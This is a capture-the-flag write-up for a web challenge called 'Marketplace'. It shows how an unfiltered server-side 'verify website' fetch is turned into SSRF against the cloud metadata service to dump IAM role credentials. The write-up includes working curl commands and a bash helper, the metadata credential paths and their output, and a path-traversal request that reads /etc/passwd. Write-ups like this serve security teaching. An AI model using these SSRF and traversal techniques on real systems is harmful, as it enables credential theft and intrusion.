---
title: "Marketplace"
ctf: "riffhack"
date: 2026-06-19
category: web
difficulty: medium
points: ?
flag_format: "bitflag{...}"
author: "CL4Y"
---

# Marketplace

> "Something in the marketplace isn't working quite right. Those who dig deeper find more than they bargained for."
> Target: `http://157.245.135.174/`

## Summary

The Next.js marketplace exposes a vendor-application "verify website" helper that fetches an attacker-supplied URL server-side and reflects the response body. The endpoint has no SSRF filtering, so pointing it at the cloud instance-metadata service (`http://169.254.169.254/`) leaks the role credentials for `RiffhackVendorVerifierRole`. The flag is stashed in the role's session token.

Two other `bitflag{...}` strings on the site are decoys planted for the obvious-but-shallow paths (`/etc/passwd` LFI on the proof-preview endpoint, and a `robots.txt`-disallowed `/operator-cache-drop` page).

## Solution

### Step 1: Discover the SSRF

The vendor-application JS bundle (`/_next/static/chunks/app/vendor-application/page-*.js`) calls:

```js
fetch("/api/vendor/verify-website", {method:"POST", body:JSON.stringify({website:e.website})})
```

The server fetches `website` and returns `{success, message, body}` — the response body is reflected back to the client. No host allowlist:

```bash
curl -s -X POST -H 'Content-Type: application/json' \
  --data '{"website":"http://example.com"}' \
  http://157.245.135.174/api/vendor/verify-website
# → {"success":true,"message":"...","body":"<!doctype html>..."}
```

### Step 2: Pivot to instance metadata and dump the role token

```bash
URL='http://157.245.135.174/api/vendor/verify-website'
hit() {
  curl -s -X POST -H 'Content-Type: application/json' \
    --data "{\"website\":\"$1\"}" "$URL" \
    | python3 -c 'import sys,json;print(json.load(sys.stdin)["body"])'
}

# Enumerate the IMDS tree
hit 'http://169.254.169.254/latest/meta-data/'
# instance-id / hostname / iam/security-credentials/ / placement/region

hit 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# RiffhackVendorVerifierRole

hit 'http://169.254.169.254/latest/meta-data/iam/security-credentials/RiffhackVendorVerifierRole'
```

Output:

```json
{
  "Code": "Success",
  "LastUpdated": "2026-05-20T09:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIA2026RIFFHACKDEMO",
  "SecretAccessKey": "redacted-training-secret",
  "Token": "bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}",
  "Expiration": "2026-05-20T15:00:00Z"
}
```

## Flag

```
bitflag{w3bs0ck3t_upgr4d3_ssrf_2026}
```

## Decoys (not the flag)

- `bitflag{pr00f_p4ths_5h0uld_st4y_1n_b0unds}` — planted in `/etc/passwd` (UID 1337 GECOS field) and reachable via path-traversal on `/api/reviews/proof?proof=../../../../etc/passwd`.
- `bitflag{r0b0ts_4r3_n0t_4_s3cr3t_v4ult}` — rendered on `/operator-cache-drop`, the path disallowed by `robots.txt`.
